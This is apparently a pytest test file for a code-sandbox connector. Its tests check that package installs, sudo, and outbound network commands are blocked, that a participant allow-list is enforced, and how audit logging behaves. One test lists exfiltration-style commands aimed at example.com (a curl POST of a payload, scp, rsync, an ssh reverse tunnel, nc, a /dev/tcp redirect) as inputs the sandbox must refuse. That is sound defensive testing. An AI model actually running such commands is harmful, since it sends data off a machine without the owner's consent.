import pytest

from connectors.code_sandbox import (
    CodeSandboxConnector,
    _extract_pending_participant_user_ids,
    get_blocked_package_install_reason,
    mark_audit_already_logged,
)


def test_get_blocked_package_install_reason_allows_non_install_commands() -> None:
    assert get_blocked_package_install_reason("python3 -c 'print(1)'") is None
    assert get_blocked_package_install_reason("node -e 'console.log(1)'") is None


def test_get_blocked_package_install_reason_blocks_common_package_managers() -> None:
    commands = [
        "npm install lodash",
        "npm run build",
        "yarn add react",
        "pnpm install zod",
        "bun add hono",
        "pip install pandas",
        "pip --version",
        "python3 -m pip install numpy",
        "uv pip install polars",
        "poetry add requests",
        "apt-get install jq",
        "apt-get update",
        "apk add curl",
        "yum update -y",
        "brew install wget",
        "brew update",
    ]

    for command in commands:
        reason = get_blocked_package_install_reason(command)
        assert reason is not None
        assert "disabled" in reason


def test_get_blocked_package_install_reason_blocks_sudo_commands() -> None:
    reason = get_blocked_package_install_reason("sudo ls -la")
    assert reason is not None
    assert "sudo" in reason.lower()

def test_get_blocked_package_install_reason_blocks_outbound_network_commands() -> None:
    commands = [
        "curl -X POST https://example.com -d @payload.txt",
        "wget https://example.com/archive.tar.gz",
        "ftp example.com",
        "sftp user@example.com",
        "scp output.txt user@example.com:/tmp",
        "rsync -avz ./ user@example.com:/tmp/out",
        "ssh -R 8080:localhost:3000 user@example.com",
        "nc example.com 9000 < payload.bin",
        "python3 -c 'import os; os.system(\"cat file > /dev/tcp/example.com/80\")'",
        "/usr/bin/curl -X POST https://example.com -d @payload.txt",
        "bash -c \"/usr/bin/wget https://example.com/archive.tar.gz\"",
    ]

    for command in commands:
        reason = get_blocked_package_install_reason(command)
        assert reason is not None
        assert "<= 1,000,000 bytes external egress policy" in reason


def test_get_blocked_package_install_reason_allows_non_network_ssh_utilities() -> None:
    assert get_blocked_package_install_reason("ssh-keygen -t ed25519 -N '' -f /tmp/id_ed25519") is None


@pytest.mark.asyncio
async def test_execute_action_rejects_package_install_before_sandbox_use() -> None:
    connector = CodeSandboxConnector(organization_id="org_123")

    result = await connector.execute_action(
        "execute_command",
        {"command": "npm install react", "conversation_id": "conv_123"},
    )

    assert result == {
        "error": (
            "Installing packages inside the code sandbox is disabled. "
            "Use the preinstalled runtimes and libraries only. "
            "Blocked command pattern: npm."
        )
    }


@pytest.mark.asyncio
async def test_execute_action_rejects_sudo_before_sandbox_use() -> None:
    connector = CodeSandboxConnector(organization_id="org_123")

    result = await connector.execute_action(
        "execute_command",
        {"command": "sudo apt-get update", "conversation_id": "conv_123"},
    )

    assert result == {
        "error": (
            "Using sudo inside the code sandbox is disabled. "
            "Run commands without elevated privileges. "
            "Blocked command pattern: sudo."
        )
    }


@pytest.mark.asyncio
async def test_execute_action_rejects_outbound_network_command_before_sandbox_use() -> None:
    connector = CodeSandboxConnector(organization_id="org_123")

    result = await connector.execute_action(
        "execute_command",
        {"command": "curl -X POST https://example.com -d @payload.txt", "conversation_id": "conv_123"},
    )

    assert result == {
        "error": (
            "Outbound network transfer commands are disabled in the code sandbox to enforce "
            "a strict <= 1,000,000 bytes external egress policy. "
            "FTP/tunneling and similar exfiltration channels are blocked. "
            "Blocked command pattern: curl."
        )
    }


@pytest.mark.asyncio
async def test_execute_action_requires_current_basebase_user_context() -> None:
    connector = CodeSandboxConnector(organization_id="org_123")

    result = await connector.execute_action(
        "execute_command",
        {"command": "python3 -c 'print(1)'", "conversation_id": "conv_123"},
    )

    assert result == {
        "error": (
            "Code sandbox execution requires an authenticated Basebase user. "
            "Unable to resolve current user context."
        )
    }


@pytest.mark.asyncio
async def test_execute_action_rejects_user_not_in_conversation_allow_list(monkeypatch) -> None:
    connector = CodeSandboxConnector(organization_id="org_123")
    monkeypatch.setattr("connectors.code_sandbox.settings.E2B_API_KEY", "test-key")

    async def _fake_allowed_users(conversation_id: str, organization_id: str) -> list[str]:
        assert conversation_id == "conv_123"
        assert organization_id == "org_123"
        return ["user_allowed"]

    monkeypatch.setattr("connectors.code_sandbox._get_conversation_allowed_user_ids", _fake_allowed_users)

    result = await connector.execute_action(
        "execute_command",
        {"command": "python3 -c 'print(1)'", "conversation_id": "conv_123", "basebase_user_id": "user_denied"},
    )

    assert result == {
        "error": (
            "Code sandbox execution is only allowed for conversation participants. "
            "Current user is not in the conversation allow-list."
        )
    }


def test_extract_pending_participant_user_ids_supports_multiple_param_shapes() -> None:
    assert _extract_pending_participant_user_ids(
        {
            "pending_participant_user_ids": ["user_a", " user_b "],
            "about_to_add_user_ids": "user_c, user_d",
            "pending_participating_user_ids": {"user_b", "user_e"},
        }
    ) == ["user_a", "user_b", "user_c", "user_d", "user_e"]


@pytest.mark.asyncio
async def test_execute_action_allows_pending_participant_when_about_to_add(monkeypatch) -> None:
    connector = CodeSandboxConnector(organization_id="org_123")
    monkeypatch.setattr("connectors.code_sandbox.settings.E2B_API_KEY", "test-key")

    async def _fake_allowed_users(conversation_id: str, organization_id: str) -> list[str]:
        assert conversation_id == "conv_123"
        assert organization_id == "org_123"
        return ["user_existing"]

    async def _fake_get_sandbox_id(conversation_id: str, organization_id: str) -> str | None:
        assert conversation_id == "conv_123"
        assert organization_id == "org_123"
        return None

    async def _fake_save_sandbox_id(conversation_id: str, organization_id: str, sandbox_id: str | None) -> None:
        assert conversation_id == "conv_123"
        assert organization_id == "org_123"
        assert sandbox_id == "sbx_new"

    def _fake_create_sandbox(
        organization_id: str,
        conversation_id: str,
        basebase_user_id: str,
        allowed_user_ids_csv: str,
    ) -> str:
        assert organization_id == "org_123"
        assert conversation_id == "conv_123"
        assert basebase_user_id == "user_new"
        assert allowed_user_ids_csv == "user_existing,user_new"
        return "sbx_new"

    def _fake_run_command(sandbox_id: str, command: str) -> dict[str, object]:
        assert sandbox_id == "sbx_new"
        assert command == "python3 -c 'print(1)'"
        return {"stdout": "1\n", "stderr": "", "exit_code": 0}

    def _fake_list_output_files(sandbox_id: str) -> list[dict[str, object]]:
        assert sandbox_id == "sbx_new"
        return []

    monkeypatch.setattr("connectors.code_sandbox._get_conversation_allowed_user_ids", _fake_allowed_users)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_id_from_db", _fake_get_sandbox_id)
    monkeypatch.setattr("connectors.code_sandbox._save_sandbox_id_to_db", _fake_save_sandbox_id)
    monkeypatch.setattr("connectors.code_sandbox._create_sandbox_sync", _fake_create_sandbox)
    monkeypatch.setattr("connectors.code_sandbox._run_command_sync", _fake_run_command)
    monkeypatch.setattr("connectors.code_sandbox._list_output_files_sync", _fake_list_output_files)

    result = await connector.execute_action(
        "execute_command",
        {
            "command": "python3 -c 'print(1)'",
            "conversation_id": "conv_123",
            "basebase_user_id": "user_new",
            "about_to_add_user_ids": ["user_new"],
        },
    )

    assert result == {"exit_code": 0, "stdout": "1\n", "stderr": ""}


@pytest.mark.asyncio
async def test_execute_action_recreates_sandbox_when_user_context_changes(monkeypatch) -> None:
    connector = CodeSandboxConnector(organization_id="org_123")
    saved: list[tuple[str, str, str | None]] = []
    killed: list[str] = []
    created: list[tuple[str, str, str, str]] = []

    monkeypatch.setattr("connectors.code_sandbox.settings.E2B_API_KEY", "test-key")

    async def _fake_allowed_users(conversation_id: str, organization_id: str) -> list[str]:
        assert conversation_id == "conv_123"
        assert organization_id == "org_123"
        return ["user_a", "user_b"]

    async def _fake_get_sandbox_id(conversation_id: str, organization_id: str) -> str | None:
        assert conversation_id == "conv_123"
        assert organization_id == "org_123"
        return "sbx_old"

    async def _fake_save_sandbox_id(conversation_id: str, organization_id: str, sandbox_id: str | None) -> None:
        saved.append((conversation_id, organization_id, sandbox_id))

    def _fake_is_alive(sandbox_id: str) -> bool:
        assert sandbox_id == "sbx_old"
        return True

    def _fake_get_context(sandbox_id: str) -> dict[str, str]:
        assert sandbox_id == "sbx_old"
        return {"basebase_user_id": "user_a", "basebase_allowed_user_ids": "user_a,user_b"}

    def _fake_kill_sandbox(sandbox_id: str) -> bool:
        killed.append(sandbox_id)
        return True

    def _fake_create_sandbox(
        organization_id: str,
        conversation_id: str,
        basebase_user_id: str,
        allowed_user_ids_csv: str,
    ) -> str:
        created.append((organization_id, conversation_id, basebase_user_id, allowed_user_ids_csv))
        return "sbx_new"

    def _fake_run_command(sandbox_id: str, command: str) -> dict[str, object]:
        assert sandbox_id == "sbx_new"
        assert command == "python3 -c 'print(1)'"
        return {"stdout": "1\n", "stderr": "", "exit_code": 0}

    def _fake_list_output_files(sandbox_id: str) -> list[dict[str, object]]:
        assert sandbox_id == "sbx_new"
        return []

    monkeypatch.setattr("connectors.code_sandbox._get_conversation_allowed_user_ids", _fake_allowed_users)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_id_from_db", _fake_get_sandbox_id)
    monkeypatch.setattr("connectors.code_sandbox._save_sandbox_id_to_db", _fake_save_sandbox_id)
    monkeypatch.setattr("connectors.code_sandbox._is_sandbox_alive_sync", _fake_is_alive)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_context_sync", _fake_get_context)
    monkeypatch.setattr("connectors.code_sandbox._kill_sandbox_sync", _fake_kill_sandbox)
    monkeypatch.setattr("connectors.code_sandbox._create_sandbox_sync", _fake_create_sandbox)
    monkeypatch.setattr("connectors.code_sandbox._run_command_sync", _fake_run_command)
    monkeypatch.setattr("connectors.code_sandbox._list_output_files_sync", _fake_list_output_files)

    result = await connector.execute_action(
        "execute_command",
        {"command": "python3 -c 'print(1)'", "conversation_id": "conv_123", "basebase_user_id": "user_b"},
    )

    assert result == {"exit_code": 0, "stdout": "1\n", "stderr": ""}
    assert killed == ["sbx_old"]
    assert created == [("org_123", "conv_123", "user_b", "user_a,user_b")]
    assert saved == [("conv_123", "org_123", "sbx_new")]


@pytest.mark.asyncio
async def test_execute_action_records_command_audit_when_not_prelogged(monkeypatch) -> None:
    connector = CodeSandboxConnector(organization_id="org_123")
    monkeypatch.setattr("connectors.code_sandbox.settings.E2B_API_KEY", "test-key")
    recorded: list[tuple[str, dict[str, object]]] = []

    async def _fake_allowed_users(_conversation_id: str, _organization_id: str) -> list[str]:
        return ["user_123"]

    async def _fake_get_sandbox_id(_conversation_id: str, _organization_id: str) -> str | None:
        return "sbx_existing"

    def _fake_is_alive(_sandbox_id: str) -> bool:
        return True

    def _fake_get_context(_sandbox_id: str) -> dict[str, str]:
        return {"basebase_user_id": "user_123", "basebase_allowed_user_ids": "user_123"}

    def _fake_run_command(_sandbox_id: str, _command: str) -> dict[str, object]:
        return {"stdout": "ok\n", "stderr": "", "exit_code": 0}

    def _fake_list_output_files(_sandbox_id: str) -> list[dict[str, object]]:
        return []

    async def _fake_record_intent(**kwargs):
        recorded.append(("intent", kwargs))
        return "change_1"

    async def _fake_record_outcome(**kwargs):
        recorded.append(("outcome", kwargs))

    monkeypatch.setattr("connectors.code_sandbox._get_conversation_allowed_user_ids", _fake_allowed_users)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_id_from_db", _fake_get_sandbox_id)
    monkeypatch.setattr("connectors.code_sandbox._is_sandbox_alive_sync", _fake_is_alive)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_context_sync", _fake_get_context)
    monkeypatch.setattr("connectors.code_sandbox._run_command_sync", _fake_run_command)
    monkeypatch.setattr("connectors.code_sandbox._list_output_files_sync", _fake_list_output_files)
    monkeypatch.setattr("services.action_ledger.record_intent", _fake_record_intent)
    monkeypatch.setattr("services.action_ledger.record_outcome", _fake_record_outcome)

    result = await connector.execute_action(
        "execute_command",
        {"command": "python3 -c 'print(1)'", "conversation_id": "conv_123", "basebase_user_id": "user_123"},
    )

    assert result == {"exit_code": 0, "stdout": "ok\n", "stderr": ""}
    assert [entry[0] for entry in recorded] == ["intent", "outcome"]


@pytest.mark.asyncio
async def test_execute_action_ignores_caller_supplied_audit_logged_flag(monkeypatch) -> None:
    connector = CodeSandboxConnector(organization_id="org_123")
    monkeypatch.setattr("connectors.code_sandbox.settings.E2B_API_KEY", "test-key")
    recorded: list[str] = []

    async def _fake_allowed_users(_conversation_id: str, _organization_id: str) -> list[str]:
        return ["user_123"]

    async def _fake_get_sandbox_id(_conversation_id: str, _organization_id: str) -> str | None:
        return "sbx_existing"

    def _fake_is_alive(_sandbox_id: str) -> bool:
        return True

    def _fake_get_context(_sandbox_id: str) -> dict[str, str]:
        return {"basebase_user_id": "user_123", "basebase_allowed_user_ids": "user_123"}

    def _fake_run_command(_sandbox_id: str, _command: str) -> dict[str, object]:
        return {"stdout": "ok\n", "stderr": "", "exit_code": 0}

    def _fake_list_output_files(_sandbox_id: str) -> list[dict[str, object]]:
        return []

    async def _fake_record_intent(**_kwargs):
        recorded.append("intent")
        return "change_1"

    async def _fake_record_outcome(**_kwargs):
        recorded.append("outcome")

    monkeypatch.setattr("connectors.code_sandbox._get_conversation_allowed_user_ids", _fake_allowed_users)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_id_from_db", _fake_get_sandbox_id)
    monkeypatch.setattr("connectors.code_sandbox._is_sandbox_alive_sync", _fake_is_alive)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_context_sync", _fake_get_context)
    monkeypatch.setattr("connectors.code_sandbox._run_command_sync", _fake_run_command)
    monkeypatch.setattr("connectors.code_sandbox._list_output_files_sync", _fake_list_output_files)
    monkeypatch.setattr("services.action_ledger.record_intent", _fake_record_intent)
    monkeypatch.setattr("services.action_ledger.record_outcome", _fake_record_outcome)

    result = await connector.execute_action(
        "execute_command",
        {
            "command": "python3 -c 'print(1)'",
            "conversation_id": "conv_123",
            "basebase_user_id": "user_123",
            "_audit_logged": True,
        },
    )

    assert result == {"exit_code": 0, "stdout": "ok\n", "stderr": ""}
    assert recorded == ["intent", "outcome"]


@pytest.mark.asyncio
async def test_execute_action_skips_connector_audit_when_prelogged_by_internal_marker(monkeypatch) -> None:
    connector = CodeSandboxConnector(organization_id="org_123")
    monkeypatch.setattr("connectors.code_sandbox.settings.E2B_API_KEY", "test-key")
    recorded: list[str] = []

    async def _fake_allowed_users(_conversation_id: str, _organization_id: str) -> list[str]:
        return ["user_123"]

    async def _fake_get_sandbox_id(_conversation_id: str, _organization_id: str) -> str | None:
        return "sbx_existing"

    def _fake_is_alive(_sandbox_id: str) -> bool:
        return True

    def _fake_get_context(_sandbox_id: str) -> dict[str, str]:
        return {"basebase_user_id": "user_123", "basebase_allowed_user_ids": "user_123"}

    def _fake_run_command(_sandbox_id: str, _command: str) -> dict[str, object]:
        return {"stdout": "ok\n", "stderr": "", "exit_code": 0}

    def _fake_list_output_files(_sandbox_id: str) -> list[dict[str, object]]:
        return []

    async def _fake_record_intent(**_kwargs):
        recorded.append("intent")
        return "change_1"

    async def _fake_record_outcome(**_kwargs):
        recorded.append("outcome")

    monkeypatch.setattr("connectors.code_sandbox._get_conversation_allowed_user_ids", _fake_allowed_users)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_id_from_db", _fake_get_sandbox_id)
    monkeypatch.setattr("connectors.code_sandbox._is_sandbox_alive_sync", _fake_is_alive)
    monkeypatch.setattr("connectors.code_sandbox._get_sandbox_context_sync", _fake_get_context)
    monkeypatch.setattr("connectors.code_sandbox._run_command_sync", _fake_run_command)
    monkeypatch.setattr("connectors.code_sandbox._list_output_files_sync", _fake_list_output_files)
    monkeypatch.setattr("services.action_ledger.record_intent", _fake_record_intent)
    monkeypatch.setattr("services.action_ledger.record_outcome", _fake_record_outcome)

    params = {
        "command": "python3 -c 'print(1)'",
        "conversation_id": "conv_123",
        "basebase_user_id": "user_123",
    }
    mark_audit_already_logged(params)
    result = await connector.execute_action("execute_command", params)

    assert result == {"exit_code": 0, "stdout": "ok\n", "stderr": ""}
    assert recorded == []
